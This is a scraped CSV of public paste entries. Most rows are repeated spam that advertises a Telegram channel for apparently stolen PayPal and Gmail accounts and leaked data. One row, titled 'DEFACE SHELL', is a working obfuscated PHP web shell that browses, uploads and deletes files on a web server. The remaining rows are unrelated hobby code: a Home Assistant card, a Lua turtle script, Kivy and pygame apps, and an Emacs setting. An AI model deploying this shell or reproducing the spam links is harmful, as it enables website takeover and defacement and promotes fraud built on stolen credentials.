id,title,username,language,date,content
q5HqeRzt,✅ Gmail FRESH 7E,liav2312,JavaScript,Tuesday 10th of June 2025 07:19:33 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
yrRfr0sq6R
"
EW57dDBB,✅ FREE GUIDE  6R,liav2312,JavaScript,Tuesday 10th of June 2025 07:19:22 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
tiWWRseBk8
"
s4NZuVjf,✅ P4YP4L Hits IC,liav2312,JavaScript,Tuesday 10th of June 2025 07:19:11 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
IEE2SgFz9P
"
2M3vmiEj,✅ Leak Pre TX,liav2312,JavaScript,Tuesday 10th of June 2025 07:19:02 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
ngrK4JB4X5
"
Ext1CRDP,✅ Gmail FRESH 7E,liav2312,JavaScript,Tuesday 10th of June 2025 07:18:52 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
ozLxHHEYpT
"
FiCftH9g,✅ P4YP4L Hits IC,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:12:44 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
48fE8y4g7I
"
ndaKrkeB,✅ Leak Pre TX,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:12:35 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
mw1tZJaCZM
"
J6j5yA06,✅ Gmail FRESH 7E,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:12:26 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
tjTHWcz8kR
"
t8CUvdbw,✅ FREE GUIDE  6R,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:12:15 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
EbT89MdAPs
"
DJ0vdWaj,✅ P4YP4L Hits IC,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:12:08 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
HMU7dBhZks
"
i6mZLGgW,✅ Leak Pre TX,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:11:52 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
eWW1ZsXTwo
"
VbhQ69Be,✅ Gmail FRESH 7E,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:11:44 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
00OlQGUpN1
"
Cg9cE1p0,✅ P4YP4L Hits IC,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:11:33 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
m9aJci72Lo
"
WKXQi9GX,✅ Gmail FRESH 7E,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:10:53 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
Pe9o9Wv1dP
"
HLP7YiwA,✅ FREE GUIDE  6R,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:10:43 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
RZ4FKw7b2e
"
ZGLy6dPj,✅ P4YP4L Hits IC,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:10:34 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
aZz4YzBKO4
"
t3wZdyCv,✅ Leak Pre TX,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:10:24 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
sKDp0VO0LN
"
JMGfPBte,✅ P4YP4L Hits IC,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:10:11 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
r2AH0rMWih
"
mtzft4Km,✅ Leak Pre TX,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:09:59 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
yFlEyLj4yT
"
TbYHLPZb,✅ Gmail FRESH 7E,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:09:48 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
1yIiBVvnNo
"
VJra2Cai,✅ FREE GUIDE  6R,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:09:37 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
ot2LeDlPJH
"
L4MCcXrb,✅ P4YP4L Hits IC,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:09:28 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
VdCYLCoz1m
"
6zhwvUP3,✅ Leak Pre TX,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:09:18 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
0bi66Wg2g8
"
gxyS1huu,✅ Gmail FRESH 7E,Marek987654321,JavaScript,Tuesday 10th of June 2025 07:09:07 PM CDT," 

𝗣𝗗𝗙: P D F  https://t.me/CracGuide
 
pD0cBGApwQ
"
cWLx6pdG,DEFACE SHELL,CaiqueONZ,PHP,Tuesday 10th of June 2025 06:59:16 PM CDT,"<?php
 goto hcO6a; xAnhK: if ($dir === false || strpos($dir, $baseDir) !== 0) { $dir = $baseDir; } goto AziM_; WiBIz: if ($mensagem) { ?>
<div class=""mensagem""><?php  echo htmlspecialchars($mensagem); ?>
</div><?php  } goto YJdTW; r08TJ: ?>
<!doctypehtml><html lang=""pt-BR""><head><meta charset=""UTF-8""><title>DEFACE SHELL</title><style>@import url(https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap);body{background-color:#000;color:#fff;font-family:'Press Start 2P',monospace;font-size:14px;padding:30px;border:4px solid purple;margin:20px}h1{color:#fff;font-size:18px;margin-bottom:10px}.current-path{margin-bottom:20px;color:#aaa;font-size:12px}.file{margin-bottom:10px}.file a{color:#0ff;text-decoration:none;margin-right:10px}.delete{color:red}.upload-box{margin-top:40px;border-top:2px dashed purple;padding-top:20px}button,input{font-family:'Press Start 2P',monospace;font-size:12px;margin:5px 0;background-color:#222;color:#fff;border:2px solid purple;padding:5px}.mensagem{color:#ff0;margin-bottom:20px}a.link-button{background:0 0;border:none;color:#0ff;cursor:pointer;font-family:'Press Start 2P',monospace;font-size:14px;padding:0;text-decoration:none}</style></head><body><h1>SNIPER SHELL - #XYZ #MUSLIM</h1><?php  goto WiBIz; vugkA: echo htmlspecialchars(mostrarCaminho($baseDir, $dir)); goto N2rE1; MRh4f: $currentRelativeDir = trim(str_replace($baseDir, '', $dir), DIRECTORY_SEPARATOR); goto E344f; fhqwH: echo urlencode($parentDir); goto drPgJ; drPgJ: ?>
""class=""link-button"">.. (VOLTAR)</a></div><?php  goto KgZTy; JhHtg: echo urlencode($dir); goto bLgyD; GMT9q: if (isset($_GET[""\144\145\154""])) { $arquivo = basename($_GET[""\x64\x65\x6c""]); $arquivoPath = $dir . DIRECTORY_SEPARATOR . $arquivo; if (file_exists($arquivoPath)) { unlink($arquivoPath); $mensagem = ""\101\162\x71\165\x69\166\157\40\x27{$arquivo}\47\x20\x64\145\154\145\164\141\x64\157\41""; } else { $mensagem = ""\101\162\x71\x75\x69\166\x6f\40\156\303\243\x6f\40\145\x6e\x63\157\x6e\164\x72\x61\144\157\x2e""; } } goto ZKk3I; ZKk3I: $arquivos = array_diff(scandir($dir), array(""\x2e"", ""\56\56"")); goto i2FwV; KgZTy: foreach ($arquivos as $arquivo) { $arquivoPath = $dir . DIRECTORY_SEPARATOR . $arquivo; if (is_dir($arquivoPath)) { $link = ""\77\144\151\162\75"" . urlencode($arquivoPath); } else { $link = htmlspecialchars($arquivoPath); } ?>
<div class=""file""><?php  if (is_dir($arquivoPath)) { ?>
<a href=""<?php  echo $link; ?>
""><?php  echo htmlspecialchars($arquivo); ?>
/</a><?php  } else { ?>
<a href=""<?php  echo $link; ?>
""target=""_blank""><?php  echo htmlspecialchars($arquivo); ?>
</a><?php  } ?>
- <a href=""?del=<?php  echo urlencode($arquivo); ?>
&dir=<?php  echo urlencode($dir); ?>
""class=""delete"">[DELETAR]</a></div><?php  } goto UoLUv; N2rE1: ?>
</strong></div><div class=""file""><a href=""?dir=<?php  goto fhqwH; hcO6a: $baseDir = realpath(""\x2f\x76\x61\x72\x2f\167\x77\x77\x2f\150\164\155\x6c""); goto fo0Ij; LelOI: if (isset($_FILES[""\x66\151\x6c\145""])) { $nome = $_POST[""\146\x69\x6c\145\156\141\155\x65""] ?: $_FILES[""\x66\x69\x6c\x65""][""\156\141\x6d\x65""]; $destino = $dir . DIRECTORY_SEPARATOR . basename($nome); if (move_uploaded_file($_FILES[""\x66\x69\154\145""][""\164\155\160\x5f\x6e\141\155\145""], $destino)) { $mensagem = ""\101\x72\x71\165\x69\166\x6f\40\47{$nome}\47\40\145\x6e\166\151\x61\x64\157\40\x63\x6f\155\x20\x73\x75\x63\145\x73\x73\x6f\x21""; } else { $mensagem = ""\x46\x61\x6c\150\x61\x20\x61\x6f\40\145\156\x76\151\141\x72\x20\157\x20\x61\x72\161\165\x69\x76\x6f\56""; } } goto GMT9q; i2FwV: $parentDir = dirname($dir); goto VSAI8; E344f: function mostrarCaminho($baseDir, $dir) { $relativo = trim(str_replace($baseDir, '', $dir), DIRECTORY_SEPARATOR); return ""\57"" . $relativo; } goto r08TJ; AziM_: $mensagem = ''; goto LelOI; UoLUv: ?>
<div class=""upload-box""><form action=""?dir=<?php  goto JhHtg; YJdTW: ?>
<div class=""current-path"">ARQUIVOS DA PASTA: <strong><?php  goto vugkA; fo0Ij: $dir = isset($_GET[""\144\x69\162""]) ? realpath($_GET[""\144\x69\x72""]) : $baseDir; goto xAnhK; VSAI8: if (strpos($parentDir, $baseDir) !== 0) { $parentDir = $baseDir; } goto MRh4f; bLgyD: ?>
""enctype=""multipart/form-data""method=""POST""><label>Selecionar arquivo:</label><br><input name=""file""required type=""file""><br><label>Nome do arquivo:</label><br><input name=""filename""placeholder=""exemplo.php""><br><input type=""submit""value=""UPLOAD""></form></div></body></html>"
nVe8Cpqy,Ha card docker monitorin,raidolo,YAML,Tuesday 10th of June 2025 05:28:09 PM CDT,"type: custom:stack-in-card
cards:
  - type: custom:button-card
    entity: sensor.docker_jellyfin_jellyfin1_cpu
    icon: mdi:jellyfish
    entity_picture: /local/images/jellyfin.png
    show_entity_picture: true
    name: Jellyfin
    styles:
      card:
        - border-style: none
        - box-shadow: 0px 0px 10px -9px black
      custom_fields:
        temp:
          - filter: opacity(100%)
          - justify-self: start
          - margin-left: 10px
          - margin-top: 20px
          - padding-bottom: 10%
          - font-size: 65%
        graph:
          - padding-top: 0%
          - width: 100%
          - height: 100%
          - margin-bottom: ""-3%""
      icon:
        - width: 25px
        - color: auto
        - margin-right: 10px
        - margin-top: 5px
      name:
        - font-size: 90%
        - font-weight: var(--mcg-title-font-weight, 500)
        - justify-self: start
        - margin-top: 20px
        - margin-left: 10px
        - margin-bottom: 10px
        - opacity: 0.65
        - text-align: center
      grid:
        - grid-template-areas: ""\""n i\"" \""temp temp\"" \""graph graph\""""
        - grid-template-columns: 1fr min-content
        - grid-template-rows: 1fr min-content min-content min-content
    custom_fields:
      temp: |
        [[[
          return `<ha-icon
            icon=""mdi:cpu-64-bit""
            style=""width:18px; height: 18px; color:#ff8c00;"">
            </ha-icon><span style=""font-size:120%; font-weight: 300;""> 
            ${states['sensor.docker_jellyfin_jellyfin1_cpu'].state}%</span> 
            <ha-icon
            icon=""mdi:memory""
            style=""width: 18px; height: 18px; color: #3399ff;"">
            </ha-icon><span style=""font-size:120%; font-weight: 300; text-align: center;"">
            ${states['sensor.docker_jellyfin_jellyfin1_memory'].state}MiB</span>`
        ]]]
    card_mod:
      style: |
        ha-card {
          z-index: 1;
          height: 100px !important;
        } 
  - type: custom:mini-graph-card
    entities:
      - entity: sensor.docker_jellyfin_jellyfin1_cpu
        name: CPU
        color: ""#ff8c00""
      - entity: sensor.docker_jellyfin_jellyfin1_memory
        name: Memory
        color: ""#3399ff""
        y_axis: secondary
    height: 50
    hours_to_show: 24
    line_width: 3
    font_size: 50
    animate: true
    show:
      name: false
      icon: false
      state: false
      legend: false
      fill: fade
    card_mod:
      style: |
        ha-card {
          position: absolute !important;
          height: 100%;
          width: 100%;
          top: 0px;
          --ha-card-border-width: 0;
        }
        ha-card:after {
          content: """";
          position: absolute;
          width: 100%;
          height: 100%;
          background: linear-gradient(to right, var(--card-background-color) 20%, transparent);
        }
"
cDZ8Wza2,KabelVerlegeBot,Myros27,Lua,Tuesday 10th of June 2025 05:25:47 PM CDT,"turtle.turnLeft()
turtle.turnLeft()
for i = 1, 64 do
  for i = 1, 5 do
    turtle.select(i)
    turtle.place()
    turtle.back()
  end
end"
cdvRwNyz,test5,soulseb,Python,Tuesday 10th of June 2025 04:46:20 PM CDT,"# для логов
import datetime
import inspect
# для самой программы
from kivy.app import App
from kivy.uix.anchorlayout import AnchorLayout
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.textinput import TextInput
from kivy.uix.dropdown import DropDown
from kivy.uix.button import Button
from kivy.uix.scrollview import ScrollView
from kivy.uix.label import Label
from kivy.properties import ListProperty
from kivy.clock import Clock

# проверка 
def log_var(var_name, var_value, log_file=""test4.log"", func_name=None):
    """"""
    Записывает в лог-файл название переменной, её значение и имя функции
    :param var_name: название переменной (строка)
    :param var_value: значение переменной
    :param log_file: путь к лог-файлу (по умолчанию test4.log)
    :param func_name: имя функции (если None, будет определено автоматически)
    """"""
    timestamp = datetime.datetime.now().strftime(""%Y-%m-%d %H:%M:%S"")
    
    # Если имя функции не указано, пытаемся определить автоматически
    if func_name is None:
        try:
            # Получаем имя вызывающей функции (2 уровня выше в стеке вызовов)
            func_name = inspect.currentframe().f_back.f_back.f_code.co_name
        except:
            func_name = ""unknown""
    
    log_message = f""[{timestamp}] [{func_name}] {var_name} = {repr(var_value)}\n""
    
    with open(log_file, ""a"", encoding=""utf-8"") as f:
        f.write(log_message)

class SearchBox(BoxLayout):
    suggestions = ListProperty([])
    
    def __init__(self, **kwargs):
        super(SearchBox, self).__init__(**kwargs)
        self.orientation = 'vertical'
        
        # Контейнер для поля поиска
        search_container = AnchorLayout(
            anchor_x='center',
            anchor_y='top',
            size_hint=(1, None),
            height=40
        )
        
        self.search_input = TextInput(
            hint_text='Введите поисковый запрос...',
            size_hint=(1, None),
            height=40
        )
        self.search_input.bind(text=self.on_text)
        search_container.add_widget(self.search_input)
        self.add_widget(search_container)
        
        # Выпадающий список (без ограничений)
        self.dropdown = DropDown()
        self.dropdown.bind(on_select=lambda i, x: (
            setattr(self.search_input, 'text', x),
            self.update_search_results(x)
        ))
        
        # Область результатов
        self.scroll = ScrollView(size_hint=(1, 1))
        self.add_widget(self.scroll)
        
        self.results_layout = BoxLayout(
            orientation='vertical',
            size_hint_y=None,
        )
        self.results_layout.bind(minimum_height=self.results_layout.setter('height'))
        self.scroll.add_widget(self.results_layout)
        
        self.all_data = [
            ""Python программирование"",
            ""Kivy разработка приложений"",
            ""Android приложения на Python"",
            ""Изучение Kivy для начинающих"",
            ""Примеры Kivy приложений"",
            ""Работа с базами данных в Python"",
            ""Мобильная разработка с Kivy"",
            ""Мобильная разработка с Kivy"",
            ""Мобильная разработка с Kivy"",
            ""Мобильная разработка с Kivy"",
            ""Мобильная разработка с Kivy"",
            ""Мобильная разработка с Kivy"",
            ""Мобильная разработка с Kivy"",
            ""Мобильная разработка с Kivy"",
            ""Мобильная разработка с Kivy"",
            ""Мобильная разработка с Kivy"",
            ""GUI приложения на Python""
        ]
        
        self.placeholder = Label(
            text=""Введите запрос для поиска"",
            size_hint_y=None,
            height=40,
            color=(0.5, 0.5, 0.5, 1),
            halign='center'
        )
        self.results_layout.add_widget(self.placeholder)
    
    def on_text(self, instance, value):
        Clock.unschedule(self.update_suggestions)
        # Сначала обновляем suggestions, затем результаты
        self.update_suggestions_immediately(value)
        Clock.schedule_once(self.update_suggestions, 0.2)
    
    def update_suggestions_immediately(self, value):
        """"""Немедленное обновление suggestions без задержки""""""
        query = value.lower().strip()
        if not query:
            self.suggestions = []
            return

        self.suggestions = [item for item in self.all_data if query in item.lower()]
        self.update_search_results(query)

    def update_suggestions(self, dt):
        query = self.search_input.text.lower().strip()
        self.dropdown.dismiss()

        if not query:
            return
            
        # Получаем ВСЕ совпадения для выпадающего списка
        self.suggestions = [item for item in self.all_data if query in item.lower()]
        self.dropdown.clear_widgets()
        
        # Создаем кнопки для всех совпадений
        for suggestion in self.suggestions:
            btn = Button(
                text=suggestion,
                size_hint_y=None,
                height=40
            )
            btn.bind(on_release=lambda btn: self.dropdown.select(btn.text))
            self.dropdown.add_widget(btn)
        
        if self.suggestions:
            self.dropdown.open(self.search_input)

    def update_search_results(self, query):
        self.results_layout.clear_widgets()

        if not query.strip():
            self.results_layout.add_widget(self.placeholder)
            return
            
        # Используем те же результаты, что и для dropdown
        results = self.suggestions
        
        if not results:
            self.results_layout.add_widget(Label(
                text=""Ничего не найдено"",
                size_hint_y=None,
                height=40,
                color=(0.7, 0.3, 0.3, 1),
                halign='center'
            ))
        else:
            for result in results:
                self.results_layout.add_widget(Button(
                    text=result,
                    size_hint_y=None,
                    height=40,
                    background_color=(0.9, 0.9, 0.9, 1)
                ))

class SearchApp(App):
    def build(self):
        return SearchBox()

if __name__ == '__main__':
    SearchApp().run()"
bYSUJctn,platforma.py,black_duck11,Python,Tuesday 10th of June 2025 03:45:08 PM CDT,"import pygame
class Platforma(pygame.sprite.Sprite):
    def __init__(self):
        super().__init__()
        self.obraz=pygame.image.load(""images/pad.png"")
        self.reset_pozycji()

    def reset_pozycji(self):
        self.rect=pygame.Rect(1024/2-70,800-100,140,30)
    def przesun(self,kierunek):
        #kierunek -1 będzie dla lewej strony, kierunek 1 
        #dla prawej
        predkosc=10
        self.rect.move_ip(kierunek*predkosc,0)
        if self.rect.left<=0: 
            self.rect.x=0
        if self.rect.right>=1024: 
            self.rect.x=1024-140
        





"
nKchTKGQ,arkanoid.py,black_duck11,Python,Tuesday 10th of June 2025 03:44:51 PM CDT,"import pygame
from platforma import Platforma
SZEROKOSC=1024
WYSOKOSC=800
ekran=pygame.display.set_mode([SZEROKOSC,WYSOKOSC])
obraz_tla=pygame.image.load('images/background.png')
status_gry=True
platforma=Platforma()
while status_gry:
    for zdarzenie in pygame.event.get():
        if zdarzenie.type==pygame.QUIT:
            status_gry=False
        elif zdarzenie.type==pygame.KEYDOWN:
            if zdarzenie.key==pygame.K_ESCAPE:
                status_gry=False
    keys=pygame.key.get_pressed()#pobieranie wciśniętych(i tzymanych)
    if keys[pygame.K_a] or keys[pygame.K_LEFT]:
        platforma.przesun(-1)
    if keys[pygame.K_d] or keys[pygame.K_RIGHT]:
        platforma.przesun(1)

    ekran.blit(obraz_tla,(0,0))
    ekran.blit(platforma.obraz,platforma.rect)
    pygame.display.flip()
pygame.quit()





"
srdinpCu,display-buffer-alist,mark-naylor-1701,Lisp,Tuesday 10th of June 2025 03:15:03 PM CDT,";; This is not original. I copied it from an article or a youtube video.


(((or (derived-mode . occur-mode) (derived-mode . help-mode))
  (display-buffer-reuse-window display-buffer-at-bottom) (dedicated . t)
  (window-height . shrink-window-if-larger-than-buffer)
  (body-function . #f(lambda (w) [t] (select-window w)))))"
ShJfBKBZ,Untitled,Redplay98,HTML,Tuesday 10th of June 2025 02:50:06 PM CDT,"Código grátis aqui: REDPLAY-S4387YC
Validade: 7 dias"
